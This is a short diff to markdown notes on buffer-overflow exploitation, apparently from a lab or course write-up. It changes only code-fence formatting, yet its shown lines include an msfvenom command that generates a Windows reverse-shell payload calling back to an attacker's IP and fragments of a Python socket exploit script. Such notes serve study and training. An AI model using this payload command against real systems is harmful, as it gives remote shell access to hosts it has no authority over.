@@ -1,10 +1,10 @@
 7-Generating Shellcode and Gaining Access
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~bash
 msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=LISTENER_PORT EXITFUNC=thread -f c -a x86 -b "\x00\OTHERBADCHARS"
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~python
 #!/usr/bin/python
 import sys, socket
 
@@ -47,4 +47,5 @@ except:
 	print "Error Connecting to Server..."
 	sys.exit()
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
+
